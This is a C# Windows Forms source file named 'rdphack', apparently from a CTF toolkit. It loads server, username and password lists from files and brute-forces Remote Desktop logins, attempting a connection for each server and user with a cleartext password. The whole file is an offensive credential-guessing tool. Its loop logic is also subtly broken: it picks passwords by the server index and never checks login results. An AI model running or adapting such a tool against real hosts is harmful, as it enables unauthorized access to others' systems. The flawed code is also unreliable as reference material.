using MSTSCLib;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BekraHayrNesterCtfTools
{
    public partial class rdphack : Form
    {
        public rdphack()
        {
            InitializeComponent();
        }
        ArrayList servernam; ArrayList user;ArrayList pass; OpenFileDialog op; Thread th;
        private void serverNameYükleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            servernam = new ArrayList();op = new OpenFileDialog();
            if (DialogResult.OK==op.ShowDialog())
            {
                th = new Thread(servernamaktar); th.Start();
            }
        }
        private void userNameYükleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            user = new ArrayList(); op = new OpenFileDialog();
            if (DialogResult.OK == op.ShowDialog())
            {
                th = new Thread(useraktar); th.Start();
            }
        }
        private void şifreYükleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            pass = new ArrayList(); op = new OpenFileDialog();
            if (DialogResult.OK == op.ShowDialog())
            {
                th = new Thread(passaktar); th.Start();
            }
        }
        private void bruteForceBaşlaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < servernam.Count; i++)
            {
                rdp.Server = servernam[i].ToString();
                for (int j = 0; j < user.Count; j++)
                {
                    rdp.UserName = user[j].ToString();

                    IMsTscNonScriptable secured = (IMsTscNonScriptable)rdp.GetOcx();

                    secured.ClearTextPassword = pass[i].ToString();

                    rdp.Connect();
                }
            }
        }
        private void servernamaktar()
        {
            var isimler = File.ReadAllLines(op.FileName.ToString());
            for (int i = 0; i < isimler.Length; i++)
            {
                servernam.Add(isimler[i].ToString());
            }
        }
        private void useraktar()
        {
            var isimler = File.ReadAllLines(op.FileName.ToString());
            for (int i = 0; i < isimler.Length; i++)
            {
                user.Add(isimler[i].ToString());
            }
        }
        private void passaktar()
        {
            var isimler = File.ReadAllLines(op.FileName.ToString());
            for (int i = 0; i < isimler.Length; i++)
            {
                pass.Add(isimler[i].ToString());
            }
        }
    }
}
